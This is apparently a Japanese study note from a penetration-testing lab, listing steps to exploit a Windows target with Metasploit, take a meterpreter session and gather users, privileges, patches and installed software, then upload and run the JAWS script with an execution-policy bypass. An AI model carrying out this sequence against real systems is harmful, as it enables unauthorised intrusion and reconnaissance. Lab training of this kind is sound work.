demo windowsのローカル列挙の自動化
1) pingを実行して、ターゲットマシンが稼働しているかどうかを確認する。
2) nmap -sVを実行して、ターゲットマシンのセキュリティホールがあるかどうかを確認する
3) searchsploit サービス名で、サービスにexploitがあるかどうかを確認する
4) service postgresql start && msfconsoleを起動する
5) 3)で探索したexploitモジュールをsearchで探索する
6) useでモジュールの設定を行う
7) show optionsで基本情報の設定を確認する
8) setで基本情報の設定を行う
9) exploitでmeterpreterを奪う。
10) ローカル列挙を自動化するためにまず、セッションをbackgoundで実行する
  
11) post/windows/gather/win_privsモジュールを使って、現在のユーザー権限の列挙を自動化するために使用する
12) runを実行して、ターゲットシステムでアクセスできる現在のユーザーの権限を列挙し、ユーザーが管理者であるかどうか、UACが有効か無効かなどの有用な情報を取得する

14) post/windows/gather/enum_logged_on_usersモジュールを使用して、現在および過去にログインしたユーザーのリストを列挙する
15) runを実行して、現在および以前にログオンしたユーザーとユーザーアカウントのそれぞれのSIDのリストを列挙する。
  
16) checkvmモジュールを利用することで、ターゲットシステムが仮想マシンかコンテナかどうかを確認する。
use post/windows/gather/checkvm
17) runを実行することで、モジュールのターゲットマシンシステムで仮想マシンが動いているかを確認する
  
18) post/windows/gather/enum_applicationsモジュールでターゲットシステムにインストールされているアプリケーション/プログラムのリストを列挙する
19) runを実行して、インストールされているアプリケーションのリストを列挙する。
＊インストールされているプログラムに存在する脆弱性を探索する際に役立つ
  
20) post/windows/gather/enum_computerモジュールを使用すると、ターゲットと同じLANに接続されているコンピュータのリストを列挙できる
21) runを実行して、ターゲットシステムがwindowsドメインの一部であるかを確認する
  
22) post/windows/gather/enum__patchesモジュールを使用すると、インストール済みのアップデートとパッチのリストを列挙する
23) runを実行後、モジュールはインストールされたパッチとk更新プログラムの一覧を、それぞれのHotFixIDとインストール日時とともに列挙する

＊このモジュール使用後は、
  「モジュールをロード後、モジュールオプションを構成する必要がある。今回はSESSIONオプションのみの構成を行う
  set SESSION ID」を行う。
  
*JAWSは、ペンテスターがローカル列挙を自動化し、Windowsシステム上の権限ベクトルを特定できるように設計されたオープンソースのpowershellスクリプト
24) このスクリプトを使用するには、スクリプトをラボ環境にコピーする必要があるので、Githubのリポジトリからスクリプトにアクセスする。
25) Githubリポジトリで、jaws-enum.ps1スクリプトに移動する。
26) スクリプトを生の形式で表示する必要があるので、生のボタンをクリックして実行する
27) スクリプトの内容を生の形式でコピーして、ラボ環境のクリップボードに貼り付ける
28) スクリプトをコピーしたら、kalilinuxシステムに戻って、mousepadなどのテキストエディターで新しいファイルを作成する。
29) その後、ファイルにコピーしたスクリプトを貼り付けて、ファイルをjaws-enum.ps1として保存する。
30) cd C:\\を実行する。tempディレクトリを作成する。
31) その後、mkdir tempでtempディレクトリを作成する。
32) cd temp
33) upload /root/Desktop/jaws-enum.ps1を実行して、コピーしたスクリプトをアップロードする
34) shellによってコマンドシェルセッションを生成する必要がある
35) powershell.exe -ExecutionPolicy Bypass -File .\jaws-enum.ps1 -OutputFilename JAWS-Enum.txtを実行する。
36) download JAWS-Enum.txtを使って、jaws-enum.ps1スクリプト完了後、分析用に出力ファイルをダウンロードする

  
  
